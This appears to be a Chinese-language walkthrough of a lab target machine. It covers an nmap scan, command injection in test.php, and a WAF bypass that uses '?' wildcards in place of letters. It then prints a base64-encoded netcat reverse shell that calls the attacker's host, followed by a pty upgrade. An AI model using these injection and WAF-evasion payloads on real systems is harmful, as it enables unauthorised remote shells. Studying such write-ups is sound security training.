先用 `nmap`查看靶机开启什么服务

![](../Images/b5f13dd97405fd4c82e2baac3b629a83.png)  

只有一个http服务，丢到爆破工具中扫描后台，得到 `test.php`

![](../Images/819692e92721944a95eee4ea04f7aafe.png)  

看链接以为是文件包含，试验了一下，都是403，估摸着是有waf拦截了，最后尝试了一下命令注入，发现可行

![](../Images/78ce8f92d5397eea24e980650d8b7af4.png)

   

手工试了一些后，发现ls、cat这些命令无法正常执行，所以只能换个方法，在尝试的时候发现用通配符问号来代替的话，不会被waf拦截

```
1.  `http://192.168.1.161/test.php?file=|/b?n/c?t%20/e?c/?a??wd`
    
```

![](../Images/c0f99d1d4fa0d40d26f9193f764bd94d.png)

![](../Images/32f131a1a32aa0fc415260eb5d0bbcd6.png)

从上面这一步可以知道这个waf的工作原理，所以我们只需要将敏感词部分用问号代替就可以绕过waf了  

那么现在的问题是，如何通过这个命令注入让靶机执行反弹shell的命令

如果是直接 `nc-e/bin/sh ip port`这种方式的话会被waf拦截，所以得想另外一种可执行命令的方法

后来就想到Linux管道符的特性

> 在Linux中，管道符左边的命令输出会作为管道符右边的命令的输入然后去执行，若存在多个则以此类推

举个例子

![](../Images/5a75fc2201f17b1b3ee2830a62e881f4.png)  

所以这里用base64的方式来传入执行的命令，然后在解码执行

明文:

```
1.  `/bin/echo "nc -e /bin/sh 192.168.1.159 4444" | /usr/bin/base64 | /bin/sh`
    
```

base64编码后及过waf操作后:

```
1.  `/b?n/e??o bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjEuMTU5IDQ0NDQg|/?s?/b??/b??e64 -d|/b?n/sh`
    
```

![](../Images/eeed7c7e2175a711e0cf20f33df92f51.png) 

其中`bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjEuMTU5IDQ0NDQg`的意思就是 `nc-e/bin/sh192.168.1.1594444`  

随后我们得到了shell，转成tty先

```
1.  `python3 -c 'import pty; pty.spawn("/bin/bash")'`
    
```

![](../Images/4f40316aea1a0137f8b1c200451654be.png) 

(注意是python3，不能直接python，神坑，这里是大佬 `RJ45`指点了一番)  

我们在 `/home/bob/`目录下发现了一个隐藏文件 `._pw_`

![](../Images/f465869fe8a3a5ff78e01756cac32b3d.png)

![](../Images/5e81c0857419eacde1da0766d179b255.png)
